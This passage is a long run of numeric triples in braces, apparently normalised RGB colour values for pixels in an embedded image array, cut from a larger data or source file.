749,0.651,0.663},{0.749,0.647,0.659},{0.749,0.651,0.663},{0.757,0.659,0.671},{0.753,0.651,0.663},{0.757,0.655,0.667},{0.765,0.667,0.678},{0.757,0.659,0.671},{0.757,0.655,0.667},{0.753,0.651,0.659},{0.757,0.651,0.663},{0.761,0.655,0.667},{0.753,0.639,0.651},{0.745,0.627,0.635},
{0.749,0.635,0.647},{0.749,0.624,0.616},{0.78,0.604,0.553},{0.804,0.6,0.506},{0.796,0.569,0.467},{0.788,0.596,0.522},{0.788,0.624,0.569},{0.812,0.686,0.643},{0.843,0.749,0.714},{0.675,0.475,0.392},{0.659,0.427,0.322},{0.69,0.451,0.333},{0.725,0.475,0.357},{0.757,0.502,0.38},{0.784,0.525,0.408},{0.812,0.557,0.443},{0.843,0.596,0.478},{0.871,0.62,0.51},{0.878,0.62,0.514},{0.89,0.631,0.529},{0.91,0.647,0.557},{0.914,0.659,0.569},{0.918,0.663,0.576},{0.922,0.667,0.58},{0.925,0.69,0.608},{0.922,0.698,0.627},{0.925,0.706,0.639},{0.929,0.706,0.651},{0.941,0.722,0.671},{0.933,0.694,0.624},{0.855,0.58,0.49},{0.941,0.698,0.616},{0.937,0.698,0.62},{0.91,0.647,0.573},{0.898,0.635,0.565},{0.918,0.686,0.624},{0.918,0.675,0.6},{0.918,0.678,0.6},{0.922,0.698,0.62},{0.922,0.698,0.612},{0.914,0.694,0.608},{0.902,0.667,0.576},{0.878,0.635,0.541},{0.863,0.616,0.522},{0.851,0.6,0.506},{0.855,0.6,0.514},{0.843,0.569,0.482},{0.808,0.529,0.439},{0.776,0.486,0.392},{0.753,0.451,0.369},{0.82,0.58,0.565},{0.831,0.588,0.576},{0.831,0.565,0.553},
{0.851,0.608,0.569},{0.91,0.812,0.78},{0.886,0.671,0.58},{0.984,0.831,0.745},{0.984,0.82,0.725},{0.984,0.816,0.722},{0.98,0.804,0.714},{0.98,0.796,0.706},{0.675,0.553,0.576},{0.675,0.553,0.576},{0.686,0.565,0.584},{0.686,0.565,0.584},{0.678,0.557,0.576},{0.702,0.584,0.6},{0.698,0.584,0.6},{0.702,0.584,0.6},{0.702,0.584,0.6},{0.702,0.584,0.604},{0.706,0.588,0.604},{0.69,0.573,0.592},{0.702,0.584,0.6},{0.702,0.584,0.6},{0.698,0.58,0.6},{0.69,0.569,0.588},{0.694,0.573,0.592},{0.706,0.588,0.604},{0.737,0.631,0.643},{0.733,0.631,0.647},{0.733,0.627,0.643},{0.737,0.624,0.639},{0.741,0.627,0.643},{0.733,0.627,0.643},{0.737,0.639,0.651},{0.737,0.635,0.647},{0.737,0.627,0.643},{0.737,0.624,0.639},{0.737,0.631,0.643},{0.741,0.635,0.651},{0.745,0.639,0.655},{0.745,0.647,0.659},{0.757,0.655,0.671},{0.757,0.659,0.671},{0.757,0.655,0.667},{0.749,0.647,0.659},{0.745,0.627,0.643},{0.737,0.624,0.631},{0.737,0.62,0.627},{0.729,0.616,0.624},{0.733,0.616,0.624},{0.729,0.612,0.62},{0.729,0.612,0.62},{0.745,0.627,0.635},{0.737,0.62,0.627},
{0.745,0.627,0.631},{0.729,0.608,0.612},{0.678,0.51,0.471},{0.659,0.443,0.337},{0.686,0.451,0.341},{0.698,0.451,0.337},{0.714,0.459,0.345},{0.729,0.478,0.357},{0.733,0.475,0.357},{0.749,0.494,0.376},{0.761,0.506,0.384},{0.776,0.522,0.396},{0.796,0.541,0.42},{0.816,0.561,0.443},{0.855,0.6,0.486},{0.91,0.651,0.553},{0.925,0.678,0.584},{0.929,0.678,0.584},{0.918,0.663,0.569},{0.894,0.631,0.545},{0.882,0.635,0.553},{0.878,0.62,0.545},{0.863,0.592,0.525},{0.851,0.569,0.518},{0.757,0.463,0.404},{0.525,0.208,0.153},{0.808,0.541,0.443},{0.933,0.686,0.588},{0.937,0.69,0.624},{0.949,0.718,0.655},{0.953,0.722,0.655},{0.949,0.725,0.655},{0.953,0.745,0.671},{0.969,0.769,0.69},{0.973,0.784,0.706},{0.973,0.776,0.702},{0.965,0.761,0.682},{0.949,0.729,0.655},{0.925,0.698,0.624},{0.91,0.667,0.592},{0.914,0.667,0.604},{0.902,0.667,0.592},{0.871,0.604,0.506},{0.843,0.565,0.478},{0.89,0.682,0.667},{0.91,0.702,0.69},{0.918,0.698,0.671},{0.933,0.733,0.698},{0.976,0.898,0.875},{0.961,0.78,0.702},{0.984,0.82,0.733},{0.984,0.82,0.725},{0.984,0.808,0.71},
{0.984,0.796,0.702},{0.984,0.792,0.706},{0.69,0.573,0.592},{0.69,0.573,0.592},{0.694,0.573,0.592},{0.694,0.573,0.592},{0.686,0.565,0.584},{0.698,0.58,0.6},{0.698,0.576,0.596},{0.706,0.592,0.608},{0.71,0.596,0.612},{0.706,0.592,0.608},{0.71,0.596,0.612},{0.706,0.592,0.608},{0.702,0.584,0.6},{0.694,0.576,0.596},{0.698,0.576,0.596},{0.698,0.576,0.596},{0.702,0.58,0.6},{0.71,0.592,0.612},{0.729,0.616,0.631},{0.725,0.616,0.631},{0.729,0.616,0.631},{0.729,0.616,0.631},{0.729,0.62,0.635},{0.729,0.616,0.627},{0.729,0.62,0.635},{0.725,0.612,0.627},{0.729,0.612,0.631},{0.725,0.612,0.627},{0.737,0.62,0.639},{0.745,0.639,0.651},{0.741,0.643,0.655},{0.745,0.647,0.659},{0.749,0.647,0.659},{0.741,0.631,0.643},{0.741,0.631,0.643},{0.741,0.631,0.643},{0.737,0.624,0.639},{0.733,0.616,0.627},{0.722,0.608,0.616},{0.714,0.596,0.604},{0.718,0.6,0.608},{0.71,0.592,0.6},{0.714,0.596,0.604},{0.725,0.608,0.616},{0.718,0.6,0.608},{0.722,0.604,0.608},{0.706,0.58,0.576},{0.682,0.463,0.365},{0.678,0.451,0.345},{0.69,0.455,0.345},{0.706,0.459,0.345},
{0.718,0.463,0.349},{0.725,0.478,0.361},{0.733,0.478,0.365},{0.753,0.502,0.38},{0.769,0.518,0.392},{0.776,0.522,0.396},{0.784,0.529,0.4},{0.8,0.545,0.416},{0.804,0.549,0.416},{0.831,0.58,0.451},{0.867,0.608,0.49},{0.898,0.651,0.545},{0.929,0.694,0.612},{0.929,0.69,0.608},{0.906,0.663,0.573},{0.894,0.639,0.553},{0.878,0.608,0.518},{0.827,0.525,0.435},{0.784,0.475,0.388},{0.761,0.459,0.376},{0.565,0.231,0.165},{0.698,0.404,0.302},{0.922,0.671,0.537},{0.949,0.702,0.584},{0.953,0.714,0.596},{0.961,0.729,0.62},{0.965,0.733,0.627},{0.969,0.745,0.631},{0.976,0.757,0.647},{0.973,0.749,0.643},{0.973,0.757,0.651},{0.973,0.749,0.647},{0.965,0.741,0.643},{0.957,0.733,0.639},{0.953,0.706,0.612},{0.949,0.706,0.616},{0.933,0.69,0.588},{0.929,0.675,0.584},{0.933,0.671,0.592},{0.941,0.682,0.596},{0.953,0.706,0.6},{0.969,0.749,0.643},{0.98,0.788,0.69},{0.984,0.808,0.714},{0.98,0.816,0.725},{0.984,0.812,0.718},{0.984,0.804,0.706},{0.984,0.796,0.702},{0.984,0.788,0.702},{0.702,0.588,0.604},{0.702,0.588,0.604},{0.694,0.576,0.596},{0.706,0.584,0.604},
{0.706,0.584,0.604},{0.706,0.584,0.604},{0.698,0.576,0.596},{0.702,0.588,0.604},{0.702,0.58,0.6},{0.702,0.58,0.6},{0.706,0.588,0.608},{0.706,0.592,0.608},{0.698,0.58,0.6},{0.698,0.58,0.6},{0.694,0.576,0.596},{0.698,0.576,0.596},{0.702,0.584,0.604},{0.706,0.588,0.604},{0.718,0.6,0.62},{0.729,0.62,0.635},{0.729,0.616,0.631},{0.722,0.608,0.624},{0.714,0.596,0.616},{0.725,0.612,0.627},{0.725,0.612,0.627},{0.722,0.604,0.624},{0.729,0.62,0.635},{0.729,0.616,0.631},{0.729,0.616,0.631},{0.737,0.631,0.647},{0.749,0.643,0.659},{0.745,0.647,0.659},{0.753,0.655,0.667},{0.745,0.639,0.651},{0.749,0.643,0.655},{0.745,0.643,0.655},{0.733,0.627,0.635},{0.741,0.624,0.631},{0.722,0.608,0.616},{0.714,0.596,0.604},{0.714,0.596,0.604},{0.725,0.608,0.616},{0.729,0.612,0.62},{0.722,0.608,0.616},{0.725,0.608,0.616},{0.729,0.612,0.62},{0.71,0.545,0.506},{0.714,0.471,0.353},{0.686,0.451,0.341},{0.686,0.451,0.341},{0.702,0.459,0.345},{0.718,0.475,0.361},{0.729,0.478,0.361},{0.741,0.49,0.373},{0.753,0.506,0.384},{0.773,0.522,0.404},{0.78,0.525,0.4},
{0.8,0.545,0.42},{0.808,0.561,0.431},{0.816,0.565,0.431},{0.835,0.584,0.451},{0.851,0.604,0.471},{0.867,0.62,0.486},{0.878,0.639,0.514},{0.902,0.659,0.557},{0.933,0.706,0.624},{0.941,0.71,0.635},{0.933,0.702,0.624},{0.914,0.663,0.58},{0.859,0.553,0.463},{0.788,0.459,0.369},{0.761,0.427,0.337},{0.667,0.298,0.204},{0.604,0.271,0.184},{0.851,0.584,0.455},{0.949,0.702,0.565},{0.965,0.725,0.588},{0.965,0.722,0.588},{0.969,0.722,0.584},{0.976,0.733,0.596},{0.98,0.741,0.608},{0.976,0.733,0.6},{0.98,0.749,0.62},{0.984,0.765,0.635},{0.984,0.765,0.639},{0.984,0.757,0.635},{0.98,0.765,0.643},{0.973,0.753,0.639},{0.969,0.745,0.635},{0.961,0.737,0.631},{0.957,0.718,0.627},{0.969,0.733,0.627},{0.973,0.769,0.667},{0.976,0.784,0.682},{0.98,0.804,0.702},{0.984,0.812,0.714},{0.984,0.804,0.71},{0.988,0.804,0.706},{0.984,0.808,0.714},{0.984,0.788,0.698},{0.698,0.584,0.6},{0.698,0.584,0.6},{0.702,0.584,0.604},{0.71,0.596,0.612},{0.706,0.592,0.608},{0.69,0.569,0.588},{0.69,0.573,0.592},{0.698,0.58,0.596},{0.686,0.569,0.588},{0.698,0.576,0.596},
{0.698,0.576,0.596},{0.702,0.58,0.6},{0.702,0.584,0.604},{0.71,0.596,0.612},{0.706,0.592,0.612},{0.71,0.596,0.612},{0.714,0.6,0.616},{0.706,0.584,0.604},{0.714,0.592,0.612},{0.718,0.6,0.616},{0.722,0.604,0.62},{0.722,0.608,0.624},{0.718,0.604,0.62},{0.725,0.612,0.627},{0.733,0.62,0.635},{0.733,0.627,0.639},{0.741,0.639,0.651},{0.737,0.627,0.639},{0.741,0.627,0.639},{0.737,0.627,0.643},{0.745,0.639,0.655},{0.757,0.659,0.671},{0.749,0.651,0.663},{0.745,0.643,0.659},{0.749,0.651,0.663},{0.749,0.639,0.655},{0.737,0.627,0.635},{0.71,0.592,0.6},{0.714,0.596,0.604},{0.722,0.604,0.612},{0.745,0.631,0.643},{0.757,0.647,0.659},{0.745,0.631,0.639},{0.733,0.62,0.627},{0.741,0.627,0.635},{0.729,0.612,0.62},{0.706,0.49,0.404},{0.706,0.467,0.345},{0.69,0.455,0.341},{0.678,0.439,0.329},{0.694,0.447,0.337},{0.71,0.459,0.349},{0.725,0.478,0.361},{0.733,0.482,0.369},{0.753,0.514,0.392},{0.769,0.518,0.396},{0.784,0.533,0.408},{0.8,0.549,0.424},{0.812,0.561,0.427},{0.831,0.58,0.447},{0.847,0.604,0.471},{0.863,0.616,0.482},{0.875,0.631,0.506},
{0.886,0.643,0.51},{0.894,0.651,0.525},{0.902,0.659,0.537},{0.918,0.675,0.576},{0.941,0.718,0.635},{0.945,0.725,0.647},{0.933,0.706,0.635},{0.886,0.604,0.514},{0.82,0.49,0.392},{0.765,0.412,0.314},{0.706,0.31,0.22},{0.553,0.192,0.122},{0.671,0.369,0.267},{0.91,0.659,0.522},{0.957,0.706,0.565},{0.965,0.714,0.565},{0.965,0.71,0.569},{0.969,0.722,0.58},{0.969,0.722,0.58},{0.976,0.729,0.592},{0.984,0.741,0.608},{0.984,0.757,0.624},{0.984,0.757,0.631},{0.984,0.765,0.639},{0.976,0.753,0.635},{0.98,0.773,0.659},{0.973,0.757,0.651},{0.969,0.741,0.639},{0.969,0.749,0.647},{0.976,0.773,0.671},{0.98,0.788,0.686},{0.98,0.788,0.686},{0.984,0.796,0.698},{0.98,0.792,0.694},{0.984,0.792,0.69},{0.984,0.788,0.686},{0.984,0.776,0.678},{0.698,0.58,0.6},{0.698,0.58,0.6},{0.702,0.584,0.6},{0.702,0.58,0.6},{0.702,0.58,0.6},{0.694,0.576,0.596},{0.69,0.576,0.596},{0.698,0.584,0.604},{0.698,0.58,0.6},{0.698,0.58,0.6},{0.702,0.584,0.604},{0.702,0.588,0.604},{0.702,0.588,0.604},{0.71,0.596,0.612},{0.714,0.6,0.616},{0.706,0.592,0.608},
{0.71,0.6,0.612},{0.706,0.592,0.608},{0.706,0.588,0.608},{0.706,0.588,0.608},{0.71,0.596,0.612},{0.718,0.604,0.62},{0.714,0.6,0.616},{0.722,0.608,0.624},{0.725,0.612,0.627},{0.729,0.62,0.635},{0.741,0.631,0.643},{0.733,0.624,0.639},{0.729,0.616,0.631},{0.737,0.631,0.647},{0.737,0.639,0.651},{0.741,0.643,0.655},{0.741,0.639,0.651},{0.737,0.635,0.643},{0.745,0.643,0.655},{0.729,0.616,0.631},{0.702,0.584,0.596},{0.702,0.584,0.592},{0.706,0.588,0.596},{0.733,0.62,0.631},{0.745,0.639,0.647},{0.749,0.635,0.647},{0.741,0.627,0.635},{0.722,0.604,0.612},{0.714,0.596,0.604},{0.698,0.553,0.533},{0.71,0.467,0.353},{0.698,0.455,0.337},{0.682,0.439,0.325},{0.678,0.439,0.325},{0.686,0.443,0.329},{0.702,0.455,0.337},{0.714,0.463,0.349},{0.725,0.478,0.361},{0.749,0.506,0.384},{0.769,0.522,0.4},{0.776,0.529,0.404},{0.792,0.541,0.416},{0.812,0.565,0.427},{0.835,0.588,0.459},{0.851,0.604,0.467},{0.871,0.631,0.502},{0.878,0.643,0.514},{0.89,0.647,0.518},{0.902,0.659,0.529},{0.914,0.678,0.553},{0.925,0.69,0.565},{0.929,0.694,0.58},{0.918,0.675,0.58},
{0.918,0.671,0.588},{0.929,0.686,0.608},{0.902,0.631,0.537},{0.867,0.553,0.447},{0.82,0.482,0.373},{0.773,0.408,0.298},{0.694,0.318,0.22},{0.612,0.263,0.176},{0.749,0.459,0.333},{0.91,0.647,0.502},{0.937,0.678,0.518},{0.945,0.686,0.533},{0.945,0.686,0.533},{0.957,0.706,0.557},{0.965,0.714,0.573},{0.976,0.745,0.612},{0.98,0.749,0.612},{0.984,0.761,0.627},{0.988,0.765,0.639},{0.98,0.765,0.647},{0.98,0.757,0.639},{0.976,0.761,0.643},{0.976,0.761,0.651},{0.976,0.769,0.671},{0.98,0.773,0.671},{0.984,0.769,0.659},{0.984,0.776,0.675},{0.984,0.769,0.663},{0.988,0.769,0.671},{0.984,0.773,0.667},{0.984,0.765,0.663},{0.686,0.565,0.584},{0.686,0.565,0.584},{0.698,0.576,0.596},{0.694,0.573,0.592},{0.694,0.573,0.592},{0.702,0.588,0.604},{0.702,0.584,0.6},{0.698,0.58,0.596},{0.698,0.58,0.6},{0.706,0.588,0.608},{0.706,0.592,0.608},{0.714,0.6,0.616},{0.714,0.6,0.616},{0.722,0.608,0.624},{0.725,0.612,0.627},{0.722,0.616,0.627},{0.722,0.608,0.624},{0.714,0.604,0.616},{0.71,0.592,0.608},{0.71,0.592,0.608},{0.714,0.6,0.616},{0.714,0.6,0.616},
{0.71,0.588,0.608},{0.706,0.584,0.604},{0.71,0.596,0.612},{0.706,0.588,0.608},{0.71,0.588,0.608},{0.706,0.588,0.604},{0.714,0.6,0.616},{0.722,0.604,0.62},{0.722,0.604,0.62},{0.725,0.612,0.627},{0.725,0.608,0.624},{0.714,0.596,0.612},{0.714,0.6,0.612},{0.698,0.576,0.588},{0.682,0.561,0.573},{0.678,0.553,0.565},{0.702,0.58,0.592},{0.725,0.612,0.624},{0.737,0.62,0.635},{0.729,0.612,0.627},{0.714,0.592,0.604},{0.714,0.596,0.608},{0.706,0.588,0.596},{0.702,0.502,0.439},{0.702,0.463,0.345},{0.678,0.439,0.322},{0.667,0.427,0.31},{0.667,0.424,0.31},{0.682,0.439,0.325},{0.69,0.447,0.329},{0.698,0.447,0.329},{0.714,0.463,0.349},{0.737,0.49,0.373},{0.757,0.51,0.392},{0.773,0.518,0.4},{0.788,0.537,0.416},{0.808,0.565,0.435},{0.824,0.573,0.447},{0.851,0.608,0.471},{0.875,0.643,0.518},{0.886,0.647,0.518},{0.902,0.659,0.525},{0.91,0.671,0.549},{0.922,0.682,0.557},{0.929,0.686,0.561},{0.941,0.71,0.592},{0.941,0.714,0.6},{0.925,0.686,0.573},{0.914,0.643,0.561},{0.937,0.702,0.627},{0.945,0.733,0.655},{0.933,0.722,0.639},{0.898,0.635,0.541},
{0.824,0.518,0.42},{0.765,0.427,0.325},{0.682,0.322,0.224},{0.565,0.22,0.137},{0.604,0.278,0.184},{0.671,0.353,0.251},{0.745,0.439,0.318},{0.871,0.576,0.435},{0.937,0.671,0.514},{0.961,0.702,0.561},{0.976,0.725,0.592},{0.98,0.745,0.616},{0.98,0.749,0.624},{0.984,0.765,0.639},{0.984,0.757,0.631},{0.984,0.757,0.643},{0.98,0.749,0.635},{0.98,0.753,0.647},{0.98,0.757,0.655},{0.984,0.757,0.647},{0.988,0.757,0.655},{0.992,0.757,0.647},{0.988,0.749,0.639},{0.988,0.753,0.647},{0.98,0.765,0.651},{0.694,0.576,0.592},{0.694,0.576,0.592},{0.698,0.58,0.6},{0.698,0.584,0.6},{0.702,0.58,0.6},{0.706,0.592,0.608},{0.702,0.588,0.604},{0.702,0.584,0.6},{0.706,0.592,0.608},{0.714,0.6,0.616},{0.718,0.604,0.62},{0.714,0.6,0.62},{0.714,0.604,0.62},{0.722,0.608,0.624},{0.733,0.62,0.635},{0.725,0.616,0.631},{0.725,0.612,0.631},{0.722,0.608,0.624},{0.718,0.608,0.624},{0.71,0.596,0.612},{0.706,0.588,0.608},{0.71,0.588,0.608},{0.706,0.588,0.608},{0.702,0.58,0.6},{0.698,0.576,0.596},{0.702,0.58,0.6},{0.698,0.58,0.6},{0.714,0.596,0.612},
{0.722,0.604,0.62},{0.722,0.608,0.624},{0.718,0.6,0.616},{0.714,0.596,0.616},{0.725,0.616,0.631},{0.722,0.604,0.624},{0.698,0.576,0.588},{0.686,0.565,0.576},{0.682,0.561,0.573},{0.706,0.588,0.596},{0.733,0.62,0.631},{0.733,0.62,0.631},{0.722,0.604,0.616},{0.702,0.584,0.592},{0.706,0.584,0.596},{0.718,0.6,0.612},{0.702,0.565,0.557},{0.702,0.471,0.365},{0.69,0.447,0.329},{0.663,0.424,0.31},{0.647,0.408,0.298},{0.655,0.42,0.306},{0.667,0.42,0.306},{0.678,0.427,0.314},{0.69,0.443,0.318},{0.702,0.447,0.329},{0.722,0.467,0.353},{0.741,0.486,0.373},{0.773,0.525,0.4},{0.784,0.537,0.416},{0.804,0.549,0.427},{0.831,0.588,0.455},{0.851,0.604,0.471},{0.867,0.635,0.498},{0.894,0.651,0.518},{0.91,0.675,0.549},{0.914,0.675,0.545},{0.925,0.686,0.565},{0.933,0.702,0.58},{0.937,0.702,0.58},{0.949,0.714,0.592},{0.953,0.725,0.604},{0.953,0.722,0.6},{0.949,0.718,0.604},{0.949,0.722,0.624},{0.965,0.753,0.678},{0.969,0.78,0.71},{0.945,0.745,0.667},{0.902,0.651,0.561},{0.835,0.537,0.431},{0.753,0.4,0.29},{0.729,0.369,0.255},{0.733,0.373,0.255},
{0.729,0.369,0.251},{0.733,0.369,0.263},{0.788,0.447,0.322},{0.867,0.565,0.424},{0.953,0.694,0.561},{0.98,0.737,0.604},{0.98,0.741,0.62},{0.98,0.757,0.635},{0.984,0.765,0.639},{0.984,0.765,0.643},{0.973,0.725,0.612},{0.969,0.729,0.612},{0.98,0.757,0.639},{0.984,0.757,0.647},{0.984,0.753,0.643},{0.988,0.749,0.639},{0.988,0.749,0.635},{0.98,0.745,0.635},{0.976,0.741,0.631},{0.702,0.588,0.604},{0.702,0.588,0.604},{0.698,0.58,0.6},{0.698,0.58,0.596},{0.706,0.584,0.604},{0.702,0.58,0.6},{0.706,0.588,0.608},{0.702,0.588,0.604},{0.714,0.6,0.616},{0.725,0.612,0.627},{0.718,0.604,0.62},{0.714,0.6,0.616},{0.718,0.604,0.62},{0.714,0.604,0.62},{0.725,0.612,0.627},{0.722,0.608,0.627},{0.718,0.608,0.624},{0.714,0.596,0.612},{0.698,0.58,0.6},{0.698,0.576,0.6},{0.69,0.569,0.588},{0.698,0.576,0.596},{0.702,0.58,0.6},{0.706,0.588,0.604},{0.698,0.58,0.6},{0.706,0.588,0.604},{0.706,0.588,0.604},{0.718,0.6,0.616},{0.729,0.616,0.631},{0.729,0.612,0.631},{0.725,0.616,0.631},{0.737,0.627,0.643},{0.722,0.608,0.624},{0.706,0.584,0.6},
{0.694,0.573,0.584},{0.71,0.596,0.608},{0.737,0.635,0.647},{0.741,0.631,0.647},{0.733,0.624,0.639},{0.729,0.624,0.635},{0.722,0.608,0.62},{0.698,0.576,0.588},{0.694,0.576,0.588},{0.698,0.573,0.584},{0.694,0.502,0.435},{0.702,0.463,0.341},{0.671,0.435,0.318},{0.647,0.412,0.298},{0.635,0.4,0.286},{0.635,0.396,0.286},{0.647,0.4,0.286},{0.663,0.416,0.302},{0.675,0.424,0.306},{0.69,0.439,0.322},{0.714,0.459,0.341},{0.725,0.467,0.349},{0.757,0.51,0.384},{0.776,0.522,0.4},{0.8,0.549,0.424},{0.835,0.592,0.459},{0.859,0.608,0.482},{0.867,0.616,0.486},{0.89,0.647,0.514},{0.902,0.659,0.525},{0.914,0.675,0.545},{0.925,0.69,0.565},{0.933,0.694,0.565},{0.941,0.706,0.58},{0.949,0.722,0.596},{0.957,0.729,0.612},{0.961,0.725,0.604},{0.961,0.733,0.612},{0.961,0.729,0.6},{0.957,0.725,0.604},{0.961,0.737,0.639},{0.973,0.776,0.706},{0.969,0.796,0.733},{0.961,0.776,0.714},{0.929,0.69,0.588},{0.882,0.612,0.49},{0.855,0.573,0.455},{0.855,0.584,0.49},{0.875,0.631,0.592},{0.875,0.596,0.561},{0.898,0.675,0.604},{0.949,0.804,0.729},{0.961,0.722,0.596},
{0.976,0.737,0.616},{0.98,0.757,0.631},{0.984,0.765,0.639},{0.984,0.761,0.639},{0.984,0.745,0.624},{0.98,0.745,0.627},{0.98,0.749,0.635},{0.98,0.737,0.627},{0.98,0.749,0.635},{0.984,0.749,0.631},{0.98,0.749,0.635},{0.98,0.745,0.631},{0.969,0.725,0.616},{0.706,0.596,0.612},{0.706,0.596,0.612},{0.702,0.58,0.6},{0.706,0.584,0.604},{0.714,0.596,0.612},{0.706,0.592,0.612},{0.706,0.588,0.608},{0.706,0.596,0.616},{0.722,0.608,0.627},{0.722,0.612,0.627},{0.722,0.616,0.631},{0.729,0.616,0.635},{0.729,0.616,0.635},{0.729,0.616,0.635},{0.714,0.604,0.62},{0.725,0.612,0.627},{0.718,0.604,0.62},{0.722,0.608,0.624},{0.706,0.592,0.608},{0.698,0.58,0.596},{0.694,0.573,0.592},{0.694,0.576,0.596},{0.694,0.576,0.592},{0.71,0.592,0.608},{0.714,0.6,0.616},{0.71,0.588,0.608},{0.718,0.604,0.62},{0.71,0.596,0.612},{0.725,0.612,0.627},{0.741,0.635,0.647},{0.741,0.635,0.651},{0.733,0.627,0.639},{0.718,0.6,0.612},{0.714,0.592,0.604},{0.733,0.624,0.635},{0.749,0.647,0.659},{0.749,0.651,0.663},{0.757,0.659,0.671},{0.753,0.655,0.667},{0.741,0.635,0.647},
{0.714,0.592,0.604},{0.69,0.569,0.58},{0.698,0.576,0.588},{0.686,0.545,0.537},{0.702,0.467,0.353},{0.686,0.447,0.329},{0.651,0.412,0.298},{0.627,0.388,0.278},{0.612,0.373,0.263},{0.62,0.38,0.267},{0.627,0.38,0.271},{0.639,0.392,0.282},{0.659,0.408,0.294},{0.678,0.427,0.306},{0.698,0.447,0.322},{0.722,0.471,0.349},{0.745,0.49,0.373},{0.773,0.518,0.392},{0.8,0.549,0.427},{0.824,0.576,0.447},{0.847,0.6,0.467},{0.867,0.62,0.482},{0.886,0.639,0.502},{0.902,0.655,0.518},{0.914,0.667,0.533},{0.925,0.686,0.557},{0.937,0.71,0.584},{0.937,0.71,0.58},{0.945,0.722,0.604},{0.949,0.722,0.6},{0.953,0.729,0.604},{0.961,0.729,0.6},{0.961,0.725,0.596},{0.961,0.725,0.604},{0.961,0.718,0.588},{0.961,0.718,0.58},{0.961,0.722,0.608},{0.953,0.733,0.631},{0.945,0.725,0.608},{0.929,0.694,0.569},{0.91,0.643,0.518},{0.918,0.686,0.592},{0.925,0.714,0.639},{0.941,0.722,0.647},{0.961,0.784,0.71},{0.98,0.835,0.761},{0.973,0.741,0.627},{0.976,0.729,0.608},{0.984,0.745,0.624},{0.988,0.753,0.631},{0.988,0.757,0.635},{0.988,0.749,0.635},{0.98,0.745,0.627},
{0.98,0.741,0.624},{0.973,0.729,0.612},{0.973,0.729,0.612},{0.976,0.741,0.627},{0.976,0.737,0.616},{0.973,0.725,0.616},{0.965,0.725,0.612},{0.702,0.584,0.604},{0.702,0.584,0.604},{0.706,0.592,0.608},{0.706,0.588,0.608},{0.718,0.604,0.62},{0.722,0.612,0.627},{0.722,0.612,0.627},{0.718,0.608,0.627},{0.722,0.616,0.631},{0.722,0.616,0.635},{0.733,0.631,0.647},{0.725,0.62,0.639},{0.718,0.616,0.635},{0.725,0.62,0.635},{0.722,0.608,0.627},{0.722,0.612,0.627},{0.722,0.608,0.624},{0.718,0.6,0.62},{0.71,0.592,0.608},{0.706,0.592,0.608},{0.702,0.58,0.6},{0.706,0.592,0.608},{0.71,0.596,0.616},{0.714,0.596,0.616},{0.718,0.604,0.62},{0.718,0.6,0.62},{0.714,0.6,0.616},{0.718,0.612,0.627},{0.757,0.659,0.671},{0.761,0.663,0.675},{0.729,0.627,0.639},{0.714,0.592,0.612},{0.714,0.596,0.612},{0.741,0.639,0.651},{0.753,0.655,0.667},{0.757,0.659,0.671},{0.749,0.643,0.659},{0.745,0.647,0.659},{0.733,0.627,0.639},{0.729,0.616,0.627},{0.694,0.573,0.58},{0.698,0.58,0.588},{0.678,0.549,0.561},{0.694,0.494,0.427},{0.694,0.455,0.333},{0.671,0.427,0.314},
{0.635,0.396,0.282},{0.608,0.369,0.263},{0.592,0.349,0.247},{0.6,0.357,0.247},{0.612,0.365,0.255},{0.624,0.373,0.263},{0.643,0.388,0.278},{0.663,0.412,0.294},{0.678,0.424,0.306},{0.698,0.443,0.322},{0.733,0.478,0.361},{0.761,0.51,0.384},{0.784,0.533,0.404},{0.82,0.573,0.443},{0.843,0.596,0.463},{0.863,0.616,0.482},{0.882,0.635,0.502},{0.898,0.651,0.518},{0.918,0.675,0.545},{0.929,0.686,0.561},{0.941,0.702,0.576},{0.945,0.714,0.588},{0.949,0.722,0.604},{0.949,0.714,0.588},{0.953,0.725,0.592},{0.957,0.725,0.592},{0.957,0.725,0.6},{0.961,0.725,0.596},{0.961,0.722,0.588},{0.961,0.718,0.58},{0.953,0.706,0.569},{0.953,0.71,0.573},{0.949,0.702,0.561},{0.941,0.698,0.549},{0.937,0.69,0.545},{0.933,0.686,0.545},{0.945,0.71,0.576},{0.957,0.729,0.596},{0.976,0.749,0.62},{0.976,0.761,0.639},{0.976,0.753,0.639},{0.976,0.729,0.62},{0.976,0.733,0.616},{0.98,0.737,0.62},{0.984,0.741,0.616},{0.976,0.729,0.604},{0.98,0.737,0.616},{0.98,0.737,0.616},{0.973,0.725,0.604},{0.973,0.718,0.6},{0.973,0.722,0.604},{0.969,0.718,0.604},{0.961,0.714,0.596},
{0.961,0.722,0.604},{0.706,0.592,0.608},{0.706,0.592,0.608},{0.71,0.592,0.612},{0.718,0.604,0.624},{0.722,0.608,0.627},{0.725,0.616,0.635},{0.729,0.62,0.639},{0.725,0.62,0.639},{0.729,0.624,0.639},{0.722,0.608,0.627},{0.714,0.604,0.624},{0.718,0.604,0.624},{0.729,0.62,0.635},{0.729,0.616,0.635},{0.722,0.608,0.627},{0.722,0.608,0.624},{0.718,0.604,0.62},{0.702,0.584,0.608},{0.694,0.573,0.592},{0.694,0.573,0.592},{0.694,0.573,0.592},{0.698,0.58,0.596},{0.698,0.58,0.6},{0.694,0.573,0.592},{0.698,0.576,0.596},{0.702,0.58,0.6},{0.718,0.608,0.624},{0.745,0.643,0.659},{0.745,0.643,0.655},{0.725,0.612,0.627},{0.702,0.584,0.6},{0.733,0.62,0.635},{0.757,0.659,0.671},{0.757,0.659,0.671},{0.757,0.659,0.671},{0.753,0.655,0.667},{0.741,0.639,0.651},{0.741,0.643,0.655},{0.745,0.635,0.651},{0.714,0.596,0.604},{0.69,0.569,0.576},{0.682,0.561,0.573},{0.671,0.518,0.498},{0.706,0.467,0.353},{0.682,0.439,0.322},{0.647,0.412,0.298},{0.608,0.373,0.259},{0.58,0.345,0.243},{0.569,0.329,0.231},{0.573,0.329,0.231},{0.588,0.345,0.239},{0.604,0.357,0.247},
